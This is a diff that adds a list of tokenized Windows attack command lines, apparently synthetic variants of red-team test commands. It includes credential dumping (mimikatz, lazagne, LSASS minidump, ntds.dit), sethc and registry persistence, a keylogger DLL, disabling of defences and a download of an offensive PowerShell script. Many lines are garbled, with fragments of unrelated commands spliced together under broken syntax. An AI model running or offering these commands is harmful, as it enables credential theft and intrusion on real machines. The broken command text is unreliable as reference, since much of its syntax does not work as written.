@@ -1,0 +1,64 @@
+query !
+icacls c : \windows\system32\sethc.exe /grant administrators : f
+nmap -o $ { file_name } ''
+bitsadmin.exe /setnotifycmdline $ { file_name } c : \users\
+rundll32 keylogger_dll.dll , keylog
+ffuf -w $ { output_path } -l $ { binary } ''
+takeown /f c : \windows\system32\sethc.exe c : \windows\system32\sethc_backup.exe
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v `` authentication packages '' /t reg_multi_sz /d `` $ { mimilib.dll_path } '' /f
+copy $ { vulnerable_version_of_amsi.dll } move } -t $ { password } $ { host 0 } '' -enabled $ { binary } /launchargs : $ { args } ''
+lazagne.exe all
+fltmc.exe unload $ { driver_name }
+cmdkey.exe /list
+reg add hklm\software\microsoft\powershell\1\shellids\microsoft.powershell /v userinitmprlogonscript /f
+clear-history
+./decode_image.exe $ { image_store_path }
+defaultaccount -loadandrundiagscript $ { dll_file_path }
+get-ciminstance -classname win32_desktop
+cmdkey.exe /list
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_sz /v `` inputprovider '' /d 1 , `` $ { dll_file_path } '' /f
+sharprdp.exe computername= $ { domain or ip } address }
+adfind.exe -gcb -sc trustdmp
+vssadmin create shadow force $ { ip_address } -o $ { archive_file_name }
+sekurlsa : :pth /user : $ { domain } /sid : { $ { time } /interactive /every : $ { format }
+tracert $ { user_name } /add
+add-localgroupmember -group `` administrators '' -member `` $ { dll_file_path } ''
+$ a = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' ''
+colorcpl $ { file_path }
+reg add `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' `` .\ { command } ''
+sc config $ { pid } objws.run : , $ { ip } ''
+del $ { output_zip_name } '' $ { args }
+put $ { docx }
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v `` enabled '' /v `` atomictest '' /t reg_sz /d `` $ { binary_file_path } '' /f
+silentrunner.exe $ { ip }
+rdrleakdiag.exe /p $ { domain }
+hack-browser-data-windows-64bit.exe
+tasklist
+ls c : 240 % \system32\windowspowershell\v1.0\powershell.exe % appdata % \updater.exe
+open $ { js_script }
+tracert $ { user_name }
+put $ { source_file } /add
+python make_image.py $ { wordlist } -t $ { time } /interactive /every : $ { packet } \ $ { day } $ { source } /d $ { command }
+hack-browser-data-windows-64bit.exe
+rundll32.exe c : \windows\system32\comsvcs.dll , minidump i = ( \windows\system32\comsvcs.dll , autorun '' -value `` $ { dll_file_path }
+get-eventlog net.webclient set opmode mode=disable
+ttdinject.exe /clientparams `` 7 tmp.run 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 domain or /launch i -l $ { command } '' -asplaintext username= $ { username } password= $ { binary_path
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v shell /d `` $ { mimilib.dll_path } '' /f
+curl http _.lastwritetime : ) /v `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\spoolsv.exe '' /d logon ;
+add-localgroupmember -group `` administrators '' -member `` $ { service_name } /o
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\spoolsv.exe '' /v globalflag /t reg_dword /d `` atomictest.dll '' /t reg_sz /f
+.\mimikatz.exe `` kerberos : :list /export '' `` altitude '' ;
+rdrleakdiag.exe /p $ { user_name } -p $ { message } -a : \windows\system32\sethc.exe
+net user administrator /domain
+net localgroup
+wt.exe $ { command }
+net user /domain
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` '' root\subscription '' /t reg_sz /d `` $ { dll_file_path } '' /f
+reg add `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v 1 /d `` binary_path '' /t bypass
+copy /y $ { command }
+psr.exe /c `` $ { hkcu\software\classes\clsid\ { registry_name } '' /t reg_dword /d 512
+dir $ { vulnerable_version_of_amsi.dll } } -h : query= $ { echo ! }
+winrar a -ibck $ { -r }
+get-ciminstance -classname win32_processor -accepteula ) c : 'https : //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 //raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 \windows\ntds\ntds.dit $ { copy % \updater.exe , convertto-securestring { attached } \windows *
+reg add `` i output_zip_name $ { username }
